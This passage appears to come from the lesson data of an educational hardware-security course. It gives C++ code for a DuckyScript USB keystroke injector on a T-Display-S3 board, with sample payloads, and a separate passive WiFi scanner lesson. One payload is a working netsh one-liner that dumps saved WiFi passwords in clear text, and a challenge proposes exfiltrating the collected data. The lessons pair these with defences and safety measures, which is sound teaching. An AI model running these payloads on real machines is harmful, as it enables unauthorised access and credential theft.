                code: '#include <TFT_eSPI.h>\n#include "USB.h"\n#include "USBHIDKeyboard.h"\n#include <SPIFFS.h>\n\nTFT_eSPI tft = TFT_eSPI();\nUSBHIDKeyboard Keyboard;\n\n// DuckyScript command processor\nvoid processLine(String line) {\n    line.trim();\n    if (line.length() == 0 || line.startsWith("REM")) return;\n    \n    if (line.startsWith("STRING ")) {\n        Keyboard.print(line.substring(7));\n    }\n    else if (line == "ENTER") {\n        Keyboard.press(KEY_RETURN);\n        Keyboard.releaseAll();\n    }\n    else if (line.startsWith("DELAY ")) {\n        delay(line.substring(6).toInt());\n    }\n    else if (line == "GUI r" || line == "WINDOWS r") {\n        Keyboard.press(KEY_LEFT_GUI);\n        Keyboard.press(\'r\');\n        Keyboard.releaseAll();\n    }\n    else if (line == "GUI") {\n        Keyboard.press(KEY_LEFT_GUI);\n        Keyboard.releaseAll();\n    }\n    else if (line == "CTRL ALT t") {\n        Keyboard.press(KEY_LEFT_CTRL);\n        Keyboard.press(KEY_LEFT_ALT);\n        Keyboard.press(\'t\');\n        Keyboard.releaseAll();\n    }\n    else if (line == "ALT F4") {\n        Keyboard.press(KEY_LEFT_ALT);\n        Keyboard.press(KEY_F4);\n        Keyboard.releaseAll();\n    }\n    else if (line == "TAB") {\n        Keyboard.press(KEY_TAB);\n        Keyboard.releaseAll();\n    }\n    else if (line == "ESCAPE") {\n        Keyboard.press(KEY_ESC);\n        Keyboard.releaseAll();\n    }\n    delay(50);  // Brief pause between commands\n}',
                language: 'C++',
                tip: '<strong>DuckyScript</strong> is the scripting language used by the USB Rubber Ducky. It is simple and widely documented. By making your engine compatible, you can use thousands of existing payloads from the security community (after reviewing them for safety).'
            },
            {
                title: 'Create Safe Demonstration Payloads',
                content: '<p>Store payload files on SPIFFS. These three payloads are safe, educational, and reversible:</p>',
                code: 'REM payload1.txt — System Info (Windows)\nREM Saves to: sysinfo.txt on Desktop\nREM System Information Collector\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c systeminfo > %USERPROFILE%\\Desktop\\sysinfo.txt\nENTER\nDELAY 2000\nREM File created on Desktop\n\nREM payload2.txt — Create Evidence File\nREM Creates a text file proving USB access\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING USB Security Assessment\nENTER\nSTRING This file was created by an authorized USB device.\nENTER\nSTRING Timestamp: \nENTER\nSTRING If you see this file, USB HID devices are not blocked.\nENTER\n\nREM payload3.txt — WiFi Passwords (Windows)\nREM Extract saved WiFi passwords\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c netsh wlan show profiles | findstr "All User" > %USERPROFILE%\\Desktop\\wifi_audit.txt & for /f "tokens=4 delims=:" %a in (\'netsh wlan show profiles ^| findstr "All User"\') do @(netsh wlan show profile name=%a key=clear | findstr "Key Content" >> %USERPROFILE%\\Desktop\\wifi_audit.txt)\nENTER',
                language: 'DuckyScript',
                tip: '<strong>Payload 3 extracts saved WiFi passwords on Windows.</strong> This is a common penetration testing technique &mdash; saved WiFi credentials are stored in plaintext by Windows and accessible to any user. The defense is to use WPA2-Enterprise with certificate-based auth instead of PSK.'
            },
            {
                title: 'Build the Display Menu',
                content: '<p>The TFT shows a list of available payloads. BOOT button scrolls, USER button executes. The display updates with execution status in real time.</p>',
                code: 'struct Payload {\n    const char* name;\n    const char* description;\n    const char* filename;\n};\n\nPayload payloads[] = {\n    {"SysInfo Dump", "Collect system info", "/payload1.txt"},\n    {"Evidence File", "Create proof of access", "/payload2.txt"},\n    {"WiFi Audit", "Extract saved WiFi keys", "/payload3.txt"}\n};\nconst int NUM_PAYLOADS = 3;\nint selected = 0;\n\nvoid drawPayloadMenu() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(0xF800, TFT_BLACK);  // Red\n    tft.setTextSize(2);\n    tft.setCursor(10, 5);\n    tft.println("USB INJECTOR");\n    \n    tft.setTextSize(1);\n    for (int i = 0; i < NUM_PAYLOADS; i++) {\n        tft.setCursor(10, 40 + i * 25);\n        if (i == selected) {\n            tft.setTextColor(TFT_BLACK, TFT_CYAN);\n        } else {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        }\n        tft.print(" ");\n        tft.print(payloads[i].name);\n        tft.print(" ");\n        \n        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);\n        tft.setCursor(10, 40 + i * 25 + 12);\n        tft.println(payloads[i].description);\n    }\n    \n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.setCursor(10, 130);\n    tft.println("BOOT=scroll  USER=execute");\n}\n\nvoid executePayload(int idx) {\n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.setCursor(10, 145);\n    tft.println("INJECTING...");\n    \n    File f = SPIFFS.open(payloads[idx].filename, "r");\n    if (!f) {\n        tft.println("ERROR: File not found");\n        return;\n    }\n    \n    int lineNum = 0;\n    while (f.available()) {\n        String line = f.readStringUntil(\'\\n\');\n        processLine(line);\n        lineNum++;\n        \n        // Update progress on display\n        tft.fillRect(10, 145, 300, 10, TFT_BLACK);\n        tft.setCursor(10, 145);\n        tft.printf("Line %d processed", lineNum);\n    }\n    f.close();\n    \n    tft.fillRect(10, 145, 300, 10, TFT_BLACK);\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(10, 145);\n    tft.println("COMPLETE");\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'Add Execution Delay and Safety Confirmation',
                content: '<p>Add a configurable delay before execution begins (default: 3 seconds). This gives the operator time to cancel if the wrong system is targeted. The display shows a countdown.</p>',
                code: 'void executeWithCountdown(int idx, int delaySec) {\n    for (int i = delaySec; i > 0; i--) {\n        tft.fillRect(10, 145, 300, 15, TFT_BLACK);\n        tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n        tft.setCursor(10, 145);\n        tft.printf("Executing in %d... (BOOT=cancel)", i);\n        \n        // Check for cancel\n        for (int ms = 0; ms < 1000; ms += 50) {\n            if (digitalRead(BTN_BOOT) == LOW) {\n                tft.fillRect(10, 145, 300, 15, TFT_BLACK);\n                tft.setTextColor(0x07E0, TFT_BLACK);\n                tft.setCursor(10, 145);\n                tft.println("CANCELLED");\n                delay(1000);\n                drawPayloadMenu();\n                return;\n            }\n            delay(50);\n        }\n    }\n    executePayload(idx);\n}',
                language: 'C++',
                tip: '<strong>The cancel window is critical.</strong> Professional tools always have an abort mechanism. In a real assessment, the operator needs to verify they are plugged into the correct target before the payload fires. Without a cancel, a misplaced device could execute on the wrong machine.'
            },
            {
                title: 'Detection and Defense Discussion',
                content: '<p>Every technique you build should be paired with its defense. USB keystroke injection can be detected and prevented:</p>' +
                         '<ul>' +
                         '<li><strong>USB Device Policies (GPO):</strong> Windows Group Policy can restrict which USB devices are allowed. Whitelist only approved keyboard VIDs/PIDs.</li>' +
                         '<li><strong>Keystroke Timing Analysis:</strong> Humans type 40-80 WPM with variable delays. USB injectors type at 1000+ WPM with uniform timing. EDR agents can detect this pattern.</li>' +
                         '<li><strong>USB Port Lockdown:</strong> Physical port locks or epoxy in unused USB ports. Simple but effective.</li>' +
                         '<li><strong>New Device Alerts:</strong> Configure the OS to alert when a new HID device is connected. On Linux: udev rules. On Windows: Group Policy or third-party tools.</li>' +
                         '<li><strong>USB Firewall:</strong> Tools like USBGuard (Linux) or commercial USB security products that prompt before allowing new devices.</li>' +
                         '</ul>',
                code: null,
                language: null,
                tip: '<strong>The lesson:</strong> USB HID trust is a design flaw in the USB specification itself. Every OS trusts HID devices by default because the spec was designed in an era when all USB devices were trusted peripherals. Modern security requires treating USB ports as untrusted network interfaces.'
            }
        ],

        testing: '<p>Verify the complete workflow:</p>' +
                 '<ul>' +
                 '<li><strong>SPIFFS:</strong> Upload the payload files to SPIFFS using PlatformIO filesystem upload. Verify they appear in the file list on the display.</li>' +
                 '<li><strong>Menu navigation:</strong> BOOT button cycles through payloads, display highlights the selected item.</li>' +
                 '<li><strong>Countdown:</strong> After pressing USER, the 3-second countdown appears with cancel option.</li>' +
                 '<li><strong>Payload 1 (SysInfo):</strong> A sysinfo.txt file appears on the target Desktop.</li>' +
                 '<li><strong>Payload 2 (Evidence):</strong> Notepad opens with the assessment text.</li>' +
                 '<li><strong>Payload 3 (WiFi):</strong> A wifi_audit.txt file appears with saved network names and keys.</li>' +
                 '<li><strong>Cancel:</strong> Pressing BOOT during countdown stops execution.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>SPIFFS upload fails:</strong> Use PlatformIO: Upload Filesystem Image (not regular Upload). Create a <code>data/</code> folder in your project root and put payload .txt files there.</li>' +
                         '<li><strong>Payload types wrong characters:</strong> USB HID uses US keyboard layout. If the target uses a different layout, characters like @, #, \\, / may map incorrectly. Test on the same layout as the target.</li>' +
                         '<li><strong>GUI+R does not open Run dialog:</strong> The target may have Windows key disabled via Group Policy, or the user may not have Run dialog enabled. This is actually a defense working correctly.</li>' +
                         '<li><strong>WiFi payload returns empty:</strong> The target may use 802.1X enterprise WiFi which does not store PSK passwords locally. Or the user account may not have admin privileges to read key content.</li>' +
                         '<li><strong>Commands execute too fast:</strong> Increase DELAY values in payloads. Some applications (Notepad, cmd) take longer to open on slower machines.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Multi-OS Payload</strong> &mdash; Create a payload that detects the target OS (Windows vs macOS vs Linux) by trying key combinations and observing timing, then branches to the correct command sequence for that OS.</p>' +
                    '<p><strong>Challenge 2: Exfiltration via WiFi</strong> &mdash; Instead of saving files to the Desktop, have the payload POST collected data to a web server running on the ESP32-S3 itself (using its WiFi AP mode). The data never touches the target filesystem.</p>' +
                    '<p><strong>Challenge 3: Build USBGuard Rules</strong> &mdash; On a Linux machine, install USBGuard and write rules that would block this device. Then test whether your rules actually prevent the payload from executing. Document the detection vs evasion game.</p>',

        stepVisuals: {},

        componentCallouts: {
            svg: '',
            components: [
                {
                    id: 't-display-s3',
                    name: 'LILYGO T-Display-S3 (from SG-103)',
                    purpose: 'Same board as SG-103. The native USB OTG presents as a USB HID keyboard to the target computer. The TFT display shows payload selection and execution status. SPIFFS flash stores payload scripts.',
                    specs: ['USB HID Class 0x03', 'SPIFFS: ~4MB usable', 'DuckyScript compatible', 'Button-triggered execution']
                }
            ]
        },

        commonMistakes: [
            {
                title: 'Executing Payloads Without Reading Them First',
                correct: 'Read every line of a payload before executing it. Understand what each command does. Run on a VM first. Only then run on real hardware.',
                incorrect: 'Downloading a payload from the internet and running it without review. DuckyScript payloads can contain destructive commands (format, delete, exfiltrate).',
                consequence: 'The payload runs commands you did not expect. Files get deleted, settings get changed, or data gets sent to an unknown server. You cannot undo keystrokes once typed.'
            },
            {
                title: 'No Execution Delay or Cancel Mechanism',
                correct: 'Always include a countdown with cancel option before payload execution. 3-5 seconds minimum. The operator must have time to verify they are on the right target.',
                incorrect: 'Payload begins typing immediately on boot or button press with no way to abort.',
                consequence: 'If the board is plugged into the wrong machine (instructor laptop, production server, another student machine), the payload executes before anyone can stop it.'
            },
            {
                title: 'Leaving the Board Plugged In After Testing',
                correct: 'Unplug the board immediately after testing. Store it in a labeled container. Never leave it connected to any machine unattended.',
                incorrect: 'Leaving the board plugged into a USB port after testing. It continues to present as a keyboard and could be accidentally triggered.',
                consequence: 'Someone bumps the button, or a reboot triggers the boot sequence, and the payload fires again on an unmonitored machine.'
            }
        ]
    }
,

    // ========================================================================
    // SG-105: WiFi Recon Scanner with Display UI
    // ========================================================================
    'sg-105': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'This uses the T-Display-S3&#39;s onboard screen and real <strong>WiFi scanning</strong> of the APs around you. Wokwi can scan a simulated network but has no T-Display and no real RF environment, so the recon dashboard only means something on the actual board.' },
        intro: '<p>Turn the T-Display-S3 into a portable WiFi reconnaissance tool. The built-in WiFi radio scans all 2.4GHz channels, and the TFT display shows a real-time list of discovered networks with signal strength, channel, and encryption type &mdash; color-coded for quick assessment.</p>' +
               '<p>Unlike SG-06 (which used the ESP32 CYD), this version runs on the S3 with its smaller 170x320 display, requiring a tighter UI layout. You will build a scrollable list view, a detail view for individual networks, and a channel utilization histogram.</p>' +
               '<p>This is a passive reconnaissance tool &mdash; it only listens, it does not transmit or connect. Passive scanning is legal in all jurisdictions.</p>',

        wiring: '    No external wiring required.\n    T-Display-S3 only.\n    WiFi uses the onboard PCB antenna.',

        wiringNotes: '<p><strong>No external wiring.</strong> The ESP32-S3 WiFi antenna is integrated on the T-Display-S3 PCB.</p>' +
                     '<p><strong>Legal note:</strong> Passive WiFi scanning (receive-only) is legal. You are only reading publicly broadcast beacon frames that every WiFi access point transmits 10 times per second. This is the same data your phone sees when you look at available networks.</p>' +
                     '<p><strong>Safety:</strong> This tool shows network names, signal strength, and encryption types. It does not capture traffic, passwords, or data. It is equivalent to running <code>iwlist scan</code> on Linux or viewing available networks on your phone.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg105-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg105-sweep{0%{opacity:0.1;transform:scaleX(0.2)}50%{opacity:0.6;transform:scaleX(1)}100%{opacity:0.1;transform:scaleX(0.2)}}' +
            '@keyframes sg105-pulse{0%,100%{opacity:0.15}50%{opacity:0.6}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg105-grid)" rx="4"/>' +
            '<text x="360" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-105 WIFI RECON SCANNER</text>' +

            '<!-- T-Display-S3 Board -->' +
            '<rect x="40" y="60" width="260" height="200" rx="12" fill="#1e2736" stroke="#a855f7" stroke-width="2"/>' +
            '<rect x="40" y="60" width="260" height="28" rx="12" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="170" y="79" text-anchor="middle" fill="#c084fc" font-size="11" font-weight="700">LILYGO T-Display-S3</text>' +
            '<!-- TFT Screen showing scan results -->' +
            '<rect x="60" y="100" width="100" height="140" rx="6" fill="#0a1628" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="110" y="118" text-anchor="middle" fill="#60a5fa" font-size="7" font-weight="600">WiFi Scanner</text>' +
            '<text x="70" y="134" fill="#22c55e" font-size="6">HomeNet_5G  -42dBm</text>' +
            '<text x="70" y="146" fill="#eab308" font-size="6">CafeWiFi    -67dBm</text>' +
            '<text x="70" y="158" fill="#ef4444" font-size="6">IoT_Device  -81dBm</text>' +
            '<text x="70" y="170" fill="#ef4444" font-size="6">[hidden]    -85dBm</text>' +
            '<text x="110" y="190" text-anchor="middle" fill="#8b949e" font-size="6">Ch 1-13 | 4 found</text>' +
            '<rect x="70" y="196" width="80" height="30" rx="3" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="78" y="208" fill="#8b949e" font-size="5">CH:</text>' +
            '<rect x="92" y="218" width="6" height="6" fill="#22c55e" opacity="0.8"/>' +
            '<rect x="100" y="214" width="6" height="10" fill="#22c55e" opacity="0.6"/>' +
            '<rect x="108" y="210" width="6" height="14" fill="#eab308" opacity="0.7"/>' +
            '<rect x="116" y="216" width="6" height="8" fill="#22c55e" opacity="0.5"/>' +
            '<rect x="124" y="220" width="6" height="4" fill="#8b949e" opacity="0.3"/>' +
            '<rect x="132" y="212" width="6" height="12" fill="#eab308" opacity="0.6"/>' +
            '<!-- ESP32-S3 chip -->' +
            '<rect x="190" y="110" width="90" height="50" rx="6" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="235" y="132" text-anchor="middle" fill="#c084fc" font-size="8" font-weight="700">ESP32-S3</text>' +
            '<text x="235" y="146" text-anchor="middle" fill="#8b949e" font-size="6">WiFi 802.11 b/g/n</text>' +
            '<!-- Onboard antenna -->' +
            '<rect x="220" y="170" width="50" height="24" rx="4" fill="rgba(249,115,22,0.08)" stroke="#f97316" stroke-width="1"/>' +
            '<text x="245" y="186" text-anchor="middle" fill="#fb923c" font-size="7">PCB ANT</text>' +
            '<!-- USB-C -->' +
            '<rect x="145" y="248" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +
            '<text x="170" y="276" text-anchor="middle" fill="#8b949e" font-size="7">USB-C (power only)</text>' +
            '<!-- Buttons -->' +
            '<circle cx="60" cy="252" r="7" fill="#1a1f2b" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="60" y="270" text-anchor="middle" fill="#22c55e" font-size="6">BOOT</text>' +
            '<circle cx="280" cy="252" r="7" fill="#1a1f2b" stroke="#eab308" stroke-width="1.5"/>' +
            '<text x="280" y="270" text-anchor="middle" fill="#eab308" font-size="6">VIEW</text>' +

            '<!-- WiFi Signal Waves (animated sweep) -->' +
            '<g transform="translate(340,140)">' +
            '<path d="M0,0 Q30,-40 60,0" fill="none" stroke="#22c55e" stroke-width="1.5" opacity="0.6" style="animation:sg105-pulse 2s ease-in-out infinite"/>' +
            '<path d="M-10,0 Q40,-60 90,0" fill="none" stroke="#22c55e" stroke-width="1.2" opacity="0.4" style="animation:sg105-pulse 2s ease-in-out 0.3s infinite"/>' +
            '<path d="M-20,0 Q50,-80 120,0" fill="none" stroke="#22c55e" stroke-width="1" opacity="0.25" style="animation:sg105-pulse 2s ease-in-out 0.6s infinite"/>' +
            '</g>' +

            '<!-- Discovered Access Points -->' +
            '<g>' +
            '<rect x="440" y="60" width="240" height="220" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="440" y="60" width="240" height="24" rx="8" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="440" y="76" width="240" height="8" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="560" y="76" text-anchor="middle" fill="#4ade80" font-size="10" font-weight="600">DISCOVERED APs</text>' +
            '<!-- AP entries -->' +
            '<rect x="455" y="95" width="210" height="36" rx="4" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.15)" stroke-width="0.5"/>' +
            '<text x="465" y="110" fill="#22c55e" font-size="8" font-weight="600">HomeNet_5G</text>' +
            '<text x="650" y="110" text-anchor="end" fill="#22c55e" font-size="7">-42 dBm</text>' +
            '<text x="465" y="124" fill="#8b949e" font-size="6">Ch 6 | WPA2 | 5C:A6:E6:xx:xx:xx</text>' +
            '<rect x="455" y="137" width="210" height="36" rx="4" fill="rgba(234,179,8,0.06)" stroke="rgba(234,179,8,0.15)" stroke-width="0.5"/>' +
            '<text x="465" y="152" fill="#eab308" font-size="8" font-weight="600">CafeWiFi</text>' +
            '<text x="650" y="152" text-anchor="end" fill="#eab308" font-size="7">-67 dBm</text>' +
            '<text x="465" y="166" fill="#8b949e" font-size="6">Ch 11 | WPA2 | A4:CF:12:xx:xx:xx</text>' +
            '<rect x="455" y="179" width="210" height="36" rx="4" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="465" y="194" fill="#ef4444" font-size="8" font-weight="600">IoT_Device</text>' +
            '<text x="650" y="194" text-anchor="end" fill="#ef4444" font-size="7">-81 dBm</text>' +
            '<text x="465" y="208" fill="#8b949e" font-size="6">Ch 1 | OPEN | 00:1A:2B:xx:xx:xx</text>' +
            '<rect x="455" y="221" width="210" height="36" rx="4" fill="rgba(239,68,68,0.04)" stroke="rgba(239,68,68,0.1)" stroke-width="0.5"/>' +
            '<text x="465" y="236" fill="#8b949e" font-size="8" font-style="italic">[hidden SSID]</text>' +
            '<text x="650" y="236" text-anchor="end" fill="#ef4444" font-size="7">-85 dBm</text>' +
            '<text x="465" y="250" fill="#8b949e" font-size="6">Ch 3 | WPA2 | hidden BSSID</text>' +
            '</g>' +

            '<!-- Signal strength legend -->' +
            '<rect x="440" y="295" width="240" height="64" rx="6" fill="rgba(59,130,246,0.04)" stroke="rgba(59,130,246,0.15)" stroke-width="0.5"/>' +
            '<text x="450" y="312" fill="#60a5fa" font-size="8" font-weight="600">SIGNAL STRENGTH</text>' +
            '<rect x="450" y="320" width="8" height="8" rx="1" fill="#22c55e"/>' +
            '<text x="464" y="328" fill="#8b949e" font-size="7">Strong (> -50 dBm)</text>' +
            '<rect x="450" y="334" width="8" height="8" rx="1" fill="#eab308"/>' +
            '<text x="464" y="342" fill="#8b949e" font-size="7">Medium (-50 to -70 dBm)</text>' +
            '<rect x="450" y="348" width="8" height="8" rx="1" fill="#ef4444"/>' +
            '<text x="464" y="356" fill="#8b949e" font-size="7">Weak (< -70 dBm)</text>' +

            '<!-- Passive scan note -->' +
            '<rect x="40" y="300" width="260" height="60" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="318" fill="#4ade80" font-size="8" font-weight="600">PASSIVE SCAN ONLY</text>' +
            '<text x="50" y="334" fill="#8b949e" font-size="7">Receive-only &#8212; reads beacon frames</text>' +
            '<text x="50" y="348" fill="#8b949e" font-size="7">No connections, no transmissions</text>' +

            '</svg>' +
            '</div>',

        steps: [
            {
                title: 'WiFi Scanner Core',
                content: '<p>The ESP32-S3 WiFi library provides <code>WiFi.scanNetworks()</code> which performs a full channel sweep and returns all visible access points. We scan in station mode without connecting to anything.</p>',
                code: '#include <TFT_eSPI.h>\n#include <WiFi.h>\n\nTFT_eSPI tft = TFT_eSPI();\n\nstruct Network {\n    String ssid;\n    int32_t rssi;\n    uint8_t channel;\n    uint8_t encType;\n    uint8_t bssid[6];\n    bool hidden;\n};\n\nNetwork networks[64];\nint networkCount = 0;\n\nvoid scanNetworks() {\n    WiFi.mode(WIFI_STA);\n    WiFi.disconnect();\n    delay(100);\n    \n    int found = WiFi.scanNetworks(false, true);  // sync, show hidden\n    networkCount = min(found, 64);\n    \n    for (int i = 0; i < networkCount; i++) {\n        networks[i].ssid = WiFi.SSID(i);\n        networks[i].rssi = WiFi.RSSI(i);\n        networks[i].channel = WiFi.channel(i);\n        networks[i].encType = WiFi.encryptionType(i);\n        networks[i].hidden = (WiFi.SSID(i).length() == 0);\n        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);\n    }\n    \n    // Sort by signal strength (strongest first)\n    for (int i = 0; i < networkCount - 1; i++) {\n        for (int j = i + 1; j < networkCount; j++) {\n            if (networks[j].rssi > networks[i].rssi) {\n                Network temp = networks[i];\n                networks[i] = networks[j];\n                networks[j] = temp;\n            }\n        }\n    }\n    WiFi.scanDelete();\n}',
                language: 'C++',
                tip: '<strong>WiFi.scanNetworks(false, true)</strong> &mdash; first param is async (false = block until done), second is show_hidden (true = include hidden SSIDs). Hidden networks broadcast beacon frames with an empty SSID field but are still discoverable by their BSSID.'
            },
            {
                title: 'Display List View',
                content: '<p>Render the network list on the 170x320 TFT with color-coded signal strength bars and encryption indicators. The small screen fits about 8 networks at a time with scrolling.</p>',
                code: 'int scrollOffset = 0;\nconst int VISIBLE_ROWS = 8;\nconst int ROW_HEIGHT = 18;\n\nuint16_t rssiColor(int32_t rssi) {\n    if (rssi > -50) return 0x07E0;  // Green: excellent\n    if (rssi > -65) return 0x07FF;  // Cyan: good\n    if (rssi > -75) return 0xFFE0;  // Yellow: fair\n    if (rssi > -85) return 0xFDA0;  // Orange: weak\n    return 0xF800;                   // Red: very weak\n}\n\nconst char* encLabel(uint8_t enc) {\n    switch (enc) {\n        case WIFI_AUTH_OPEN: return "OPEN";\n        case WIFI_AUTH_WEP: return "WEP";\n        case WIFI_AUTH_WPA_PSK: return "WPA";\n        case WIFI_AUTH_WPA2_PSK: return "WPA2";\n        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";\n        case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";\n        case WIFI_AUTH_WPA3_PSK: return "WPA3";\n        default: return "???";\n    }\n}\n\nvoid drawNetworkList() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Header\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(1);\n    tft.setCursor(5, 2);\n    tft.printf("WIFI RECON  %d networks  CH scan", networkCount);\n    tft.drawLine(0, 12, 320, 12, 0x2104);  // Dim separator\n    \n    // Network rows\n    for (int i = 0; i < VISIBLE_ROWS && (i + scrollOffset) < networkCount; i++) {\n        int idx = i + scrollOffset;\n        Network &n = networks[idx];\n        int y = 16 + i * ROW_HEIGHT;\n        \n        // Signal bar\n        int barWidth = map(constrain(n.rssi, -100, -30), -100, -30, 2, 30);\n        tft.fillRect(2, y + 2, barWidth, 12, rssiColor(n.rssi));\n        \n        // SSID\n        tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        tft.setCursor(36, y + 3);\n        String displaySSID = n.hidden ? "(hidden)" : n.ssid;\n        if (displaySSID.length() > 18) displaySSID = displaySSID.substring(0, 18) + "..";\n        tft.print(displaySSID);\n        \n        // Channel + Encryption\n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(230, y + 3);\n        tft.printf("CH%2d %s", n.channel, encLabel(n.encType));\n        \n        // RSSI value\n        tft.setTextColor(rssiColor(n.rssi), TFT_BLACK);\n        tft.setCursor(290, y + 3);\n        tft.printf("%d", n.rssi);\n    }\n    \n    // Scroll indicator\n    if (networkCount > VISIBLE_ROWS) {\n        int barH = max(10, (VISIBLE_ROWS * 144) / networkCount);\n        int barY = 16 + (scrollOffset * 144) / networkCount;\n        tft.fillRect(317, barY, 3, barH, 0x4208);\n    }\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'Channel Histogram View',
                content: '<p>Switch to a channel utilization view showing how many networks are on each channel. This helps identify congestion and find the quietest channel &mdash; useful for both offense (finding targets) and defense (optimizing your own network).</p>',
                code: 'void drawChannelHistogram() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Count networks per channel\n    int channelCount[14] = {0};\n    for (int i = 0; i < networkCount; i++) {\n        if (networks[i].channel >= 1 && networks[i].channel <= 13) {\n            channelCount[networks[i].channel]++;\n        }\n    }\n    \n    // Find max for scaling\n    int maxCount = 1;\n    for (int ch = 1; ch <= 13; ch++) {\n        if (channelCount[ch] > maxCount) maxCount = channelCount[ch];\n    }\n    \n    // Header\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setCursor(5, 2);\n    tft.printf("CHANNEL MAP  %d networks", networkCount);\n    \n    // Draw bars\n    int barWidth = 20;\n    int maxBarHeight = 100;\n    for (int ch = 1; ch <= 13; ch++) {\n        int x = 10 + (ch - 1) * 23;\n        int barH = (channelCount[ch] * maxBarHeight) / maxCount;\n        int y = 130 - barH;\n        \n        // Color: non-overlapping channels (1,6,11) in green, others yellow\n        uint16_t color = (ch == 1 || ch == 6 || ch == 11) ? 0x07E0 : 0xFFE0;\n        \n        if (barH > 0) {\n            tft.fillRect(x, y, barWidth, barH, color);\n        }\n        \n        // Channel label\n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(x + 4, 135);\n        tft.printf("%d", ch);\n        \n        // Count label\n        if (channelCount[ch] > 0) {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n            tft.setCursor(x + 4, y - 10);\n            tft.printf("%d", channelCount[ch]);\n        }\n    }\n    \n    // Legend\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(5, 130);\n    tft.print("Green=non-overlapping (1,6,11)");\n    tft.setTextColor(0xFFE0, TFT_BLACK);\n    tft.setCursor(5, 142);\n    tft.print("Yellow=overlapping channels");\n}',
                language: 'C++',
                tip: '<strong>Channels 1, 6, and 11</strong> are the only non-overlapping 2.4GHz channels. In a well-designed network, all APs use only these three. If you see networks on channels 2-5 or 7-10, they are causing co-channel interference with their neighbors.'
            },
            {
                title: 'Auto-Scan Loop with View Toggle',
                content: '<p>Combine everything: auto-scan every 10 seconds, toggle between list view and channel histogram with the BOOT button, scroll the list with the USER button.</p>',
                code: 'enum View { VIEW_LIST, VIEW_CHANNELS };\nView currentView = VIEW_LIST;\nunsigned long lastScan = 0;\nconst unsigned long SCAN_INTERVAL = 10000;\n\nvoid setup() {\n    Serial.begin(115200);\n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    pinMode(0, INPUT_PULLUP);   // BOOT\n    pinMode(14, INPUT_PULLUP);  // USER\n    \n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setCursor(20, 60);\n    tft.setTextSize(2);\n    tft.println("WIFI RECON");\n    tft.setTextSize(1);\n    tft.setCursor(20, 90);\n    tft.println("Scanning...");\n    \n    scanNetworks();\n    drawNetworkList();\n}\n\nvoid loop() {\n    // Auto-scan\n    if (millis() - lastScan > SCAN_INTERVAL) {\n        scanNetworks();\n        if (currentView == VIEW_LIST) drawNetworkList();\n        else drawChannelHistogram();\n        lastScan = millis();\n    }\n    \n    // BOOT: toggle view\n    if (digitalRead(0) == LOW) {\n        currentView = (currentView == VIEW_LIST) ? VIEW_CHANNELS : VIEW_LIST;\n        if (currentView == VIEW_LIST) drawNetworkList();\n        else drawChannelHistogram();\n        delay(300);\n    }\n    \n    // USER: scroll (list view only)\n    if (digitalRead(14) == LOW && currentView == VIEW_LIST) {\n        scrollOffset += VISIBLE_ROWS;\n        if (scrollOffset >= networkCount) scrollOffset = 0;\n        drawNetworkList();\n        delay(300);\n    }\n}',
                language: 'C++',
